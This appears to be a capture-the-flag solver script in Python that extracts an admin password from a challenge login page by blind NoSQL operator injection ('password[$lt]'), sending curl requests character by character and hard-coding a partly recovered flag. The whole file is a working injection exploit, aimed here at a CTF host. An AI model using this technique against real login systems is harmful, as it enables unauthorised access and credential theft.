import requests
import urllib3
import string
import subprocess
urllib3.disable_warnings()
# Define the URL and data to be sent
url = "https://no_sqli.challenge.alphabit.club/login"
flag="AlphaCTF{7H3_PR0BL3M_W4S_N3V3R_1N_SQL_Y0U_JUST_h4v3_SK1LL_1SSU3S}"
headers={'content-type': 'application/x-www-form-urlencoded'}


while True:
    for c in list(map(chr,range(32,125))):
        data = {
            "username": "admin",
            "password[$lt]": c
        }


        # Define the curl command as a list of strings
        curl_command = [
            "curl",
            "-i",
            "-X",
            "POST",
            "--data-urlencode",
            "username=admin",
            "--data-urlencode",
            "password[$lt]="+flag+c,
            "https://no_sqli.challenge.alphabit.club/login",
            
        ]
    
        try:
           
            completed_process = subprocess.run(curl_command, capture_output=True, text=True, check=True)
            response_text = completed_process.stdout
        except subprocess.CalledProcessError as e:
            print("Error executing command:", e)


        if "nothing" in response_text:
            flag += letter
            print(flag)
            break
        letter=c



